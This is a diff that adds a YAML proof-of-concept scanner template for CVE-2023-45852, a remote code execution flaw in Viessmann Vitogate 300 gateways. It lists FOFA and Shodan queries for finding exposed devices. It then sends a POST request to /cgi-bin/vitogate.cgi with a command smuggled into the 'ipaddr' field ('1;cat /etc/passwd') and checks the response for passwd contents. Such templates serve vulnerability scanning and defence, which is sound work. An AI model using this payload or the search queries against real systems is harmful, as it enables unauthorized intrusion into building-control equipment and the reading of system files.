@@ -1,0 +1,33 @@
+id: poc-yaml-viessmann-vitogate-vitogate-cgi-rce
+info:
+  name: Viessmann Vitogate远程代码执行漏洞(CVE-2023-45852)
+  severity: critical
+  tags:
+  - 两高一弱
+  - rce
+  - CVE-2023-45852
+  finger: Vitogate 300
+  fofa: body="Vitogate 300"
+  shodan: title="Vitogate 300"
+requests:
+- method: POST
+  path: /cgi-bin/vitogate.cgi
+  headers:
+    Content-Type: application/json
+  data: '{"method":"put","form":"form-4-8","session":"","params":{"ipaddr":"1;cat
+    /etc/passwd"}}
+
+    '
+  expression: 'status_code == 200
+
+    && contains(body,"root:")
+
+    && contains(body,"/bin")
+
+    && contains(body,"traceinfo")
+
+    && !contains(body,"<")
+
+    '
+variables: {}
+transport: http
